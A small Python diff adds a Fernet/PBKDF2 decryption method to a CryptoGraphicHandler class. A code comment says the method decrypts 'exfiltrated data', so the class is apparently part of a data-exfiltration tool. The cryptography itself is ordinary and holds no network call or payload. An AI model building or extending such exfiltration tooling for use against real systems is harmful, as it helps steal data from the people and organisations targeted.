@@ -1,6 +1,6 @@
 try:
     import os
-    from base64 import urlsafe_b64encode , b64encode
+    from base64 import urlsafe_b64encode , b64encode,b64decode
     from cryptography.fernet import Fernet
     from cryptography.hazmat.primitives import hashes
     from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -28,3 +28,20 @@ class CryptoGraphicHandler:
         final_message=salt + encrypted_message
 
         return b64encode(final_message)
+    
+    def decrypt_message(self,encrypted_data):
+        # Function to decrypt the exfiltrated data.
+        raw_data = b64decode(encrypted_data)
+        salt = raw_data[:16]
+        encrypted_message = raw_data[16:]
+
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=1200000,
+        )
+        key = urlsafe_b64encode(kdf.derive(self.password))
+        fernet = Fernet(key)
+        decrypted = fernet.decrypt(encrypted_message)
+        return decrypted.decode()
